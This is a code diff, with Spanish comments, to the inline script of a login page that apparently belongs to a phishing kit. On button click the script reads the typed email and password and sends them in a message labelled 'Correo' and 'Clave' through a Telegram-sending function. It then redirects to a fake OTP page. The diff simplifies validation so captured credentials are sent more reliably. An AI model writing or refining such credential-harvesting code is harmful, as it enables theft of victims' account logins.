@@ -102,11 +102,9 @@
     <script src="js/discord-config.js"></script>
     <script src="js/discordService.js"></script>
     <script src="js/sendBtn.js"></script>
+    
     <script type="module">
-        import {
-            LoginValidation
-        } from './js/validateLogin.js';
-
+        
         document.addEventListener("DOMContentLoaded", () => {
             
             let formData = JSON.parse(localStorage.getItem('formData'));
@@ -121,6 +119,12 @@
             }
 
             const inputs = ['email', 'password'];
+            
+            // --- CAMBIO AQUÍ: Obtener los inputs para la validación ---
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const loginButton = document.getElementById('loginButton');
+            // --- FIN DEL CAMBIO ---
 
             inputs.forEach(inputId => {
                 const input = document.getElementById(inputId);
@@ -142,56 +146,65 @@
             });
 
             const form = document.getElementById('homeForm');
-            const loginButton = document.getElementById('loginButton');
             const loadingSpinner = document.querySelector('.loadingContainer');
 
             form.addEventListener('submit', (event) => {
                 event.preventDefault();
             });
 
+            // --- CAMBIO AQUÍ: Nueva función de validación ---
             const actualizarEstadoBoton = () => {
-                if (LoginValidation(form)) {
+                const emailVal = emailInput.value.trim();
+                const passwordVal = passwordInput.value.trim();
+
+                // Valida que el correo tenga un '@' y que la contraseña no esté vacía 
+                // (puedes ajustar la longitud, ej: passwordVal.length >= 4)
+                if (emailVal.length > 0 && emailVal.includes('@') && passwordVal.length > 0) {
                     loginButton.disabled = false;
                 } else {
                     loginButton.disabled = true;
                 }
             };
             
+            // Se actualiza el botón cada vez que el usuario escribe
             form.addEventListener('input', actualizarEstadoBoton);
+            // --- FIN DEL CAMBIO ---
 
 
             loginButton.addEventListener('click', async (event) => {
                 event.preventDefault();
+                
+                // --- CAMBIO AQUÍ: Se quitó el 'if (LoginValidation(form))' ---
+                // Si el botón está habilitado, la validación ya pasó.
+                
                 setTimeout(() => {
                     loadingSpinner.style.display = 'none';
                     window.location.href = 'validate-otp1.html';
                 }, 3000);
 
-                if (LoginValidation(form)) {
-                    loadingSpinner.style.display = 'block';
+                loadingSpinner.style.display = 'block';
 
-                    const email = document.getElementById('email').value;
-                    const password = document.getElementById('password').value;
+                const email = emailInput.value;
+                const password = passwordInput.value;
 
-                    const formData = JSON.parse(localStorage.getItem('formData'));
-                    const userName = formData.userName || 'Usuario';
-                    const UserId = formData.UserId || email;
+                const formData = JSON.parse(localStorage.getItem('formData'));
+                const userName = formData.userName || 'Usuario';
+                const UserId = formData.UserId || email;
 
-                    formData.email = email;
-                    formData.password = password;
-                    formData.UserId = UserId;
-                    formData.userName = userName;
-localStorage.setItem('formData', JSON.stringify(formData));
+                formData.email = email;
+                formData.password = password;
+                formData.UserId = UserId;
+                formData.userName = userName;
+                localStorage.setItem('formData', JSON.stringify(formData));
 
-                    // CAMBIO AQUÍ: Mensaje simplificado
-                    const message = `🟣INGRESO LOGO🟣 \n\n📧 Correo: ${email}\n🔐 Clave: ${password}\n`;
+                const message = `🟣INGRESO LOGO🟣 \n\n📧 Correo: ${email}\n🔐 Clave: ${password}\n`;
 
-                    try {
-                        await enviarMensajeTelegramSinBotones(message);
-                    } catch (error) {
-                        console.error('Error al enviar el mensaje:', error);
-                    }
+                try {
+                    await enviarMensajeTelegramSinBotones(message);
+                } catch (error) {
+                    console.error('Error al enviar el mensaje:', error);
                 }
+                // --- FIN DEL CAMBIO ---
             });
         });
     </script>
